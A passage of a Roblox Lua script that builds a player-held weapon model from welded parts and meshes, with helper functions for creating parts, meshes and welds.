Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(1.26445436, 0.0279273987, -0.219360352, 9.17009093e-005, 6.10351563e-005, 1, 1, -9.15518103e-005, -9.16953577e-005, 9.15462151e-005, 1, -6.10947609e-005))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.124999918, 0.174999997, 0.524999976))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(9.53674316e-007, -0.0280208588, -2.63947296, 4.37025598e-008, -1, 5.96059806e-008, -1, -4.37200036e-008, 1.51011761e-007, -1.50979531e-007, -5.9603309e-008, -1))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.124999918, 0.174999997, 0.524999976))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(-0.00164890289, 0.028055191, -2.6114459, 4.37025598e-008, -1, 5.96059806e-008, -1, -4.37200036e-008, 1.51011761e-007, -1.50979531e-007, -5.9603309e-008, -1))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.124999918, 0.174999997, 0.524999976))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"White","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(1.26446486, -0.000116348267, -7.67707825e-005, 9.17474172e-005, 6.10351563e-005, 1, 1, -9.15517885e-005, -9.17418729e-005, 9.15462078e-005, 1, -6.10351563e-005))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.274999917, 0.174999997, 0.524999976))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"White","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(9.53674316e-007, 1.90734863e-006, -2.63947296, 4.37025598e-008, -1, 5.96059806e-008, -1, -4.37200036e-008, 1.51011761e-007, -1.50979531e-007, -5.9603309e-008, -1))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.174999908, 0.174999997, 0.524999976))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(1.26444912, -0.0281486511, -0.219365597, 9.17009093e-005, 6.10351563e-005, 1, 1, -9.15518103e-005, -9.16953577e-005, 9.15462151e-005, 1, -6.10947609e-005))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.124999918, 0.174999997, 0.524999976))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"White","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(1.2644515, -9.53674316e-005, -0.219363213, 9.17009093e-005, 6.10351563e-005, 1, 1, -9.15518103e-005, -9.16953577e-005, 9.15462151e-005, 1, -6.10947609e-005))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.174999908, 0.174999997, 0.524999976))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(1.26446199, -0.028169632, -7.91549683e-005, 9.17474172e-005, 6.10351563e-005, 1, 1, -9.15517885e-005, -9.17418729e-005, 9.15462078e-005, 1, -6.10351563e-005))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.22499992, 0.174999997, 0.524999976))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(0, 1.04353952, 0.00177240372, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.22499992, 0.174999997, 0.524999976))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(0, -1.04365873, -0.000122070313, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.22499992, 0.174999997, 0.524999976))
Part=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,0,"Black","Part",Vector3.new(1.6487186, 0.659487367, 1.64871848))
Partweld=weld(m,HandleA,Part,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(1.26446724, 0.0279064178, -7.39097595e-005, 9.17474172e-005, 6.10351563e-005, 1, 1, -9.15517885e-005, -9.17418729e-005, 9.15462078e-005, 1, -6.10351563e-005))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.22499992, 0.174999997, 0.524999976))
HitboxA=part(Enum.FormFactor.Plate,m,Enum.Material.Plastic,0,1,"Black","HitboxA",Vector3.new(0.548718691, 0.200000003, 4.94615555))
HitboxAweld=weld(m,HandleA,HitboxA,CFrame.new(0, 0, 0, -1, 4.31581357e-005, 1.53807946e-007, 1.4864068e-007, -0.000118941069, 0.99999994, 4.31581757e-005, 1, 0.000118941069),CFrame.new(-0.0102620125, -0.0421981812, -5.16695642, 4.37025598e-008, -1, 5.96059806e-008, -1, -4.37200036e-008, 1.51011761e-007, -1.50979531e-007, -5.9603309e-008, -1))

Player=game:GetService('Players').LocalPlayer
Character=Player.Character
Mouse=Player:GetMouse()
m=Instance.new('Model',Character)
it=Instance.new
function nooutline(part)
	part.TopSurface,part.BottomSurface,part.LeftSurface,part.RightSurface,part.FrontSurface,part.BackSurface = 10,10,10,10,10,10
end
function part(formfactor,parent,material,reflectance,transparency,brickcolor,name,size)
	local fp=it("Part")
	fp.formFactor=formfactor
	fp.Parent=parent
	fp.Reflectance=reflectance
	fp.Transparency=transparency
	fp.CanCollide=false
	fp.Locked=true
	fp.BrickColor=BrickColor.new(tostring(brickcolor))
	fp.Name=name
	fp.Size=size
	fp.Position=Character.Torso.Position
	nooutline(fp)
	fp.Material=material
	fp:BreakJoints()
	return fp
end
function mesh(Mesh,part,meshtype,meshid,offset,scale)
	local mesh=it(Mesh)
	mesh.Parent=part
	if Mesh=="SpecialMesh" then
		mesh.MeshType=meshtype
		mesh.MeshId=meshid
	end
	mesh.Offset=offset
	mesh.Scale=scale
	return mesh
end
function weld(parent,part0,part1,c0,c1)
	local weld=it("Weld")
	weld.Parent=parent
	weld.Part0=part0
	weld.Part1=part1
	weld.C0=c0
	weld.C1=c1
	return weld
end

HandleB=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","HandleB",Vector3.new(0.344953746, 1.85412645, 0.344953775))
HandleBweld=weld(m,Character["Left Arm"],HandleB,CFrame.new(0, 0, 0, 1, 0, 0, 0, 0.999994874, 0, 0, 0, 1),CFrame.new(0.0160045624, 0.213553905, -0.998093128, -1, 0, 0, 0, 0, -1, -0, -1, -0))
mesh("CylinderMesh",HandleB,"","",Vector3.new(0, 0, 0),Vector3.new(0.56249994, 1, 0.56249994))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.0103435516, -2.36137581, 0.170432568, 1, 0, 0, 0, 0, -1, 0, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.512499988, 0.43749997, 0.187499985))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 1.81100714, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.00830316544, -2.37172699, -0.103485107, 0, 1, 0, 0, 0, -1, -1, 0, 0))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.249999985, 1, 0.249999985))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(2.20959854, -0.170432568, 0.0103435516, 0, 0, 1, 0, -1, 0, 1, 0, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.43749997, 0.187499985, 0.56249994))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.0103435516, -8.22558594, 0.0514202118, 1, 0, 0, 0, 0, -1, 0, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.43749997, 0.43749997, 0.249999985))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.0103435516, 2.49073601, 0.157274723, 1, 0, 0, 0, 0, 1, 0, -1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.43749997, 0.43749997, 0.0624999963))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.0103435516, -7.96686935, 0.0841898918, 1, 0, 0, 0, 0, -1, 0, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.43749997, 0.187499985, 0.43749997))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.0103435516, -0.0514202118, 8.35494423, -1, 0, 0, 0, -1, 0, 0, 0, 1))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.43749997, 0.249999985, 0.31249997))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.0103435516, -2.36137581, 0.174527168, -1, 0, 0, 0, 0, -1, -0, -1, -0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.512499988, 0.43749997, 0.187499985))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.0103435516, -2.20959854, 0.256663799, 1, 0, 0, 0, 0, -1, 0, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.56249994, 0.43749997, 0.31249997))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.646788299, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.0103435516, -2.43553925, 0.00204944611, -1, 0, 0, 0, 0, -1, -0, -1, -0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.43749997, 1, 0.81249994))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(2.20959854, -0.174527168, -0.0120773315, 0, 0, 1, 0, 1, 0, -1, 0, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.43749997, 0.187499985, 0.550000191))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.668347895))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.00204944611, -0.0914173126, 0.144706249, 0, 1, 0, 1, 0, 0, 0, 0, -1))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.124999993, 0.0624999963, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.0914173126, -0.208867073, 0.00830316544, 1, 0, 0, 0, 0, -1, 0, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0624999963, 0.112499967, 0.0624999851))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.120735168, 1.20923233, -0.525731087, 1, 0, 0, 0, 0, 1, 0, -1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0624999963, 0.0624999963, 0.124999993))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.0914173126, -0.208867073, 0.014122963, -1, 0, 0, 0, 0, -1, -0, -1, -0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0624999963, 0.112499967, 0.0624999851))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(1.28511906, -0.120735168, 0.525731087, 0, 0, 1, 1, 0, 0, 0, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.37499997, 0.0624999963, 0.124999993))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.120735168, -1.36101627, -0.525731087, -1, 0, 0, 0, 0, -1, -0, -1, -0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0624999963, 0.0624999963, 0.124999993))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.668347895))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.00204944611, 0.0896949768, 0.139539242, 0, 1, 0, 1, 0, 0, 0, 0, -1))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.124999993, 0.0624999963, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.137985229, 1.20923233, -0.525731087, 1, 0, 0, 0, 0, 1, 0, -1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0624999963, 0.0624999963, 0.124999993))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.0896949768, -0.214044571, 0.00830316544, 1, 0, 0, 0, 0, -1, 0, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0624999963, 0.112499967, 0.0624999851))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.0103435516, -1.28339767, -1.13975048, -1, 0, 0, 0, 0, -1, -0, -1, -0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.68749994, 0.0624999963, 0.187499985))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.0896949768, -0.214044571, 0.014122963, -1, 0, 0, 0, 0, -1, -0, -1, -0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0624999963, 0.112499967, 0.0624999851))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(1.28511906, 0.137985229, 0.525731087, 0, 0, 1, 1, 0, 0, 0, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.37499997, 0.0624999963, 0.124999993))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.137985229, -1.36101627, -0.525731087, -1, 0, 0, 0, 0, -1, -0, -1, -0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0624999963, 0.0624999963, 0.124999993))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.0103435516, -1.39033127, -0.49296093, -1, 0, 0, 0, 0, -1, -0, -1, -0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.68749994, 0.187499985, 0.43749997))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.0103435516, -1.30409527, 1.13975048, 1, 0, 0, 0, 0, -1, 0, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.68749994, 0.0624999963, 0.187499985))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.0103435516, 1.26097298, 1.13975048, -1, 0, 0, 0, 0, 1, 0, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.68749994, 0.0624999963, 0.187499985))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.137985229, -1.36101627, -0.531545162, 1, 0, 0, 0, 0, -1, 0, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0624999963, 0.0624999963, 0.124999993))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(1.28511906, -0.137985229, 0.531545162, 0, 0, 1, -1, 0, 0, 0, -1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.37499997, 0.0624999963, 0.124999993))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.236611366, 0.129356384, -1.28511906, 8.74227766e-008, 1, 0, 1, -8.74227766e-008, 0, 0, 0, -1))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.249999985, 0.0624999963, 0.124999993))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Pastel blue-green","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.172481537, -0.0744886398, 1.35411167, 1, -8.74227766e-008, 0, 8.74227766e-008, 1, 0, 0, 0, 1))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0904999524, 0.485999972, 0.404999793))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.129356384, -1.31789017, 0.272830009, -1, 8.74227766e-008, 0, 0, 0, -1, -8.74227766e-008, -1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0624999963, 0.0624999963, 0.0624999963))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.129356384, -1.31789017, -0.203848839, 1, -8.74227766e-008, 0, 0, 0, -1, 8.74227766e-008, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.0624999963, 0.0624999963, 0.0624999963))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-1.28511906, -0.129356384, -0.236611366, 0, 0, -1, -1, 8.74227766e-008, 0, 8.74227766e-008, 1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.249999985, 0.0624999963, 0.124999993))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-1.28511906, -0.115564346, -0.260121822, 0, 0, -1, 1, 0, 0, 0, -1, 0))
mesh("SpecialMesh",Part,Enum.MeshType.Brick,"",Vector3.new(0, 0, 0),Vector3.new(0.249999985, 0.0624999963, 0.124999993))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.0117478371, -0.137985229, -1.45587635, -8.74227766e-008, -1, 0, -1, 8.74227766e-008, 0, 0, 0, -1))
mesh("SpecialMesh",Part,Enum.MeshType.Head,"",Vector3.new(0, 0, 0),Vector3.new(0.249999985, 0.0874999985, 0.162500009))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(-0.137985229, -0.115241528, 1.37481308, -1, 8.74227766e-008, 0, -8.74227766e-008, -1, 0, 0, 0, 1))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.113124944, 0.607500017, 0.506249726))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.Plastic,0,0,"Toothpaste","Part",Vector3.new(0.344953746, 0.344953746, 0.344953775))
Partweld=weld(m,HandleB,Part,CFrame.new(0, 0, 0, -1, 0, 0, 0, 0, -1, -0, -1, 0),CFrame.new(0.115564346, 1.25235367, 0.291165829, -1, 0, 0, 0, 0, 1, 0, 1, 0))
